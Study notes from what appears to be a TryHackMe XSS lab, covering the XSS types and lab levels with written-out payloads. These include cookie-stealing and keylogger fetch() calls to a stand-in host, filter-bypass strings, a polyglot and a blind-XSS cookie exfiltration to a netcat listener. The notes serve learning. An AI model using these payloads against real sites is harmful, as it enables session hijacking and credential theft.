Intro to cross-site scripting

Cross-Site Scripting, better known as XSS in the cybersecurity 
community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.  

- XSS found in Shopify
- $7,500 for XSS found in Steam chat
- $2,500 for XSS in HackerOne
- XSS found in Infogram
-------------------------------------

payload = the payload is the javascript code we want executed on the target comp
2 parts to it
- intention
	this what u wish the javascript to do 
- modification
	changes to the code we need to make it execute as every scenario is differ 
----------
XSS Intention
- proof of concepts
	simplest payload, demonstrate you can achieve XSS on website.
	causes an alert box to pop up on the page with a string txt
	<script>alert('XSS');</script>
- session stealing
	detail of a user session, login tokens, are often in cookies on targets machines
	 The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure 
	successful transmission and then posts it to a website under the hacker's control to be logged.
	once have cookie, can take over the target session and be logged as user
	<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
- keylogger
	This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
	<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
- business logic
	This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript
	 function for changing the user's email address called user.changeEmail()
	<script>user.changeEmail('attacker@hacker.thm');</script>
	
	Now that the email address for the account has changed, the attacker may perform a reset password attack.
	The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly
	 different attack payloads and user interaction.

reflected XSS = happens when user supplied data in an HTTP request is included in webpage source without validation
ex:
  typically when putting incorrect input an error message is displayed 
  in some cases no error message is displayed and the attacker can insert malicious code

1. attacker send link to victim that contain malicious payload
2. victim clicks link and is taken to vulnerable website
3. link containing attacker script is executed on website
4. data the attacker script gathered is sent to them
   they could steal the victims cookie which would allow 
   the attacker to take over the victims account

potential impact = attacker can send links or embed them into an iframe on 
	on another website containing a javascript payload to potential victims getting them
	to  execute code on their browser, potentially revealing session or customer information.

TESTING REFLECTED XSS
- parameters in the url query string
- url file path
- sometimes http headers (although unlikely exploitable in practice)

-------  
Stored XSS
XSS payload is stored on the web applic in a database and then gets run when
other users visit the site or web page 

EX:
- a blog website that allows users to post comments
- sometimes the comments arent checked for java or bad code
- if java is postede in comments then will be stored in database
- now every user visting article will have the java ran in their browser

potential impact = The malicious JavaScript could redirect users to another site, steal the 
		   user's session cookie, or perform other website actions while acting as the visiting user.

how to TEST for Stored XSS
- Comments on a blog
- User profile information
- Website Listings

changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS
 example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request
 rather than using the form allowing you to try malicious payloads

Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can 
successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected

DOM Based XSS

DOM = Document object model
is a programming interface for HTML/XML docs. represents page do program can change doc structure and content
A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

MORE ABOUT DOM w3.org
----------

exploiting the DOM
Dom based XSS is where the java execution happens in browser without new page being loaded or data submitted to backend code
Execution occurs when the website JavaScript code acts on input or user interaction.

EX:
the website javascript gets the content from the window.location.hash parameter and then writes that onto the page in the 
currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

potential impact
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

How to TREAT for DOM Based XSS
You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed 
to unsafe JavaScript methods such as eval().

--------------------------------

Blind XSS is similar  to a stored XSS in that you payload gets stored on the website for another user to view
in this instance you cant see the payload working or be able to test it against yourself first

EX:
website = contact form where you can message a member of staff
message doesnt get checked for maliciouse code which allows the attacker to enter anything
message = turned to support tickets which staff view on a priv web portal

potential attack:
using correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the 
staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. 
Now the attacker could potentially hijack the staff member's session and have access to the private portal.

TEST for BLIND XSS
when testing ensure payload has a call back (normally a http request) to know if/when code execute
- popular tool XSS Hunter Express
- possible to make own code      but will auto capture cookie,url content, etc
-----------------------------------------
task 7
payoad = java code want execute on another user browser or as proof of concept to demonstrate a vulnerability in a website
- can bring up alert box to prove can execute java on website
  to extract info or extract users session


1. 
theres an input to insert name
when u do it shows your name and is show in page source
if input 
<script>alert('THM');</script>

it gives an Alert that says THM
showng that it has been executed

2.
same as last but when it shows your name it is shows as input
the name is being reflected inside the value atribute of input tag
- cant run the last code cuz cant run it from inside input tag
instead do     
"><script>alert('THM');</script>

does the same action like last
the "> closes the value parameter and then closes the input tag

3.
same like 2. but this time with textarea tag
we can use
</textarea><script>alert('THM');</script>

</textarea> causes textarea element to close

4.
when name entered looks the same as 1. but when inspect source code
it is written in jave instead
----------------------
<script>
        document.getElementsByClassName('name')[0].innerHTML='yo';
    </script>
-------------------------
';alert('THM');//

' closes the field specifying name
; signifies the end of current command 
// at end makes anything after it a comment rather than executable code

5.
same as 1. and name gets reflected in same place
but if your try to use the same code it wont work
because the word script gets filtered out 
we can try

<sscriptcript>alert('THM');</sscriptcript>

it removes script only and leave the s and cript

6.
similar to 2. if we try same code to escape tag doesnt work cuz <> get filtered
so lets take advantage of image

 /images/cat.jpg" onload="alert('THM');

---------------------------
<div class="text-center">
        <h2>Your Picture</h2>
        <img src="/images/cat.jpg" onload="alert('THM');">
</div>
--------------------------
XSS polyglots = string of txt that can escape attributes, tags and bypass filters all in one
you could have used the below polygot on all 6 levels and would execute successfuly

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
---------------------------------
Blind XSS Vulnerability

we created a ticket on a website tried closing the textarea and was successful
we can
- steal user cookies to escalate priviledge by hijacking login session
- payload needs to extract the users cookie and exfiltrate it to another webserver server of our choice
1. set up listening server too recieve info (Netcat)
ex:	
     -l = use netcat listen mode
     -p = specify port num
     -n = avoid resolution of hostname via dns 
     -v = discover any errors running netcat in verbose mode
we get 
	nc -nlvp 9001
payload
	</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
------------------------
 </textarea> = closes the text area field.
 <script> = opens an area for us to write JavaScript.
fetch() = command makes an HTTP request.
URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
?cookie= is the query string containing the victim’s cookies.
btoa() = command base64 encodes the victim’s cookies.
document.cookie accesses the victim’s cookies for the Acme IT Support Website.
</script> = closes the JavaScript code block.
------------------------------
the ip num needs to be the vm_ip not the target_ip

then we get the cookie, we can decode it in www.base64decode.org

and it shows the staff-session cookie 
staff-session=**B305E55955197693F01D6F8FD*****





